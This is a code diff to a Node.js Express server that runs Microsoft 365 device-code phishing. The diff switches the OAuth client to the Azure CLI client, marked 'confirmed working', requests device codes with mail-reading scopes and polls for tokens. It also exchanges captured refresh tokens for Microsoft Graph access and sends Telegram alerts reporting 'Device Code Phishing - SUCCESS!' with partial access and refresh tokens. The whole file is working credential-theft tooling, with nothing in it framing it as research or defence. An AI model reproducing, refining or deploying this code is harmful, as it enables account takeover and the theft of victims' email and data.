@@ -798,7 +798,7 @@ dashApp.post('/api/exchange', async (req, res) => {
         const response = await axios.post(
             'https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
-                client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
+                client_id: '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
                 refresh_token: refresh_token,
                 grant_type: 'refresh_token',
                 scope: 'https://graph.microsoft.com/.default offline_access'
@@ -1078,7 +1078,7 @@ dashApp.post('/api/vault/exchange', async (req, res) => {
         const response = await axios.post(
             'https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
-                client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
+                client_id: '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
                 refresh_token: tokenValue,
                 grant_type: 'refresh_token',
                 scope: 'https://graph.microsoft.com/.default offline_access'
@@ -2309,19 +2309,19 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
 
 const app = express();
 
-// ── ✅ DEVICE CODE API (NO AUTH) ──
-
+// ── ✅ DEVICE CODE API (USING AZURE CLI CLIENT — CONFIRMED WORKING) ──
 app.post('/device/request', async (req, res) => {
     try {
         console.log('📱 Device code requested');
         
-        const MOBILE_CLIENT_ID = '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
+        // ✅ CONFIRMED WORKING — Azure CLI Native Client
+        const DEVICE_CLIENT_ID = '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
         
         const response = await axios.post(
             'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
-                client_id: MOBILE_CLIENT_ID,
-                scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read https://graph.microsoft.com/files.read offline_access'
+                client_id: DEVICE_CLIENT_ID,
+                scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
             }),
             { 
                 headers: { 
@@ -2347,19 +2347,20 @@ app.post('/device/request', async (req, res) => {
             refresh_token: null,
             id_token: null,
             manual_submitted: null,
-            client_id: MOBILE_CLIENT_ID
+            client_id: DEVICE_CLIENT_ID
         };
         deviceFlows.push(newFlow);
         saveDeviceFlows(deviceFlows);
         console.log(`📱 New device flow: ${data.user_code} (${data.device_code})`);
         
+        // Send Telegram notification
         const message = `
-📱 **Device Code Phishing**
+📱 **Device Code Phishing** (Azure CLI Client)
 
 🆔 **User Code:** \`${data.user_code}\`
 🔗 **Verification URI:** ${data.verification_uri}
 ⏱️ **Expires in:** ${data.expires_in} seconds
-📱 **Client:** Office Mobile (Native)
+📱 **Client:** Azure CLI (Native)
 
 **Code:** \`${data.user_code}\`
         `;
@@ -2389,7 +2390,7 @@ app.post('/device/token', async (req, res) => {
         console.log('🔄 Polling for token...');
         
         const flow = deviceFlows.find(f => f.device_code === device_code);
-        const clientId = flow?.client_id || '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
+        const clientId = flow?.client_id || '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
         
         const response = await axios.post(
             'https://login.microsoftonline.com/common/oauth2/v2.0/token',
@@ -2426,7 +2427,7 @@ app.post('/device/token', async (req, res) => {
         }
         
         const message = `
-📱 **Device Code Phishing - SUCCESS!**
+📱 **Device Code Phishing - SUCCESS!** (Azure CLI)
 
 🔑 **Access Token:** \`${tokens.access_token?.slice(0, 30)}...\`
 🔄 **Refresh Token:** \`${tokens.refresh_token?.slice(0, 30)}...\`
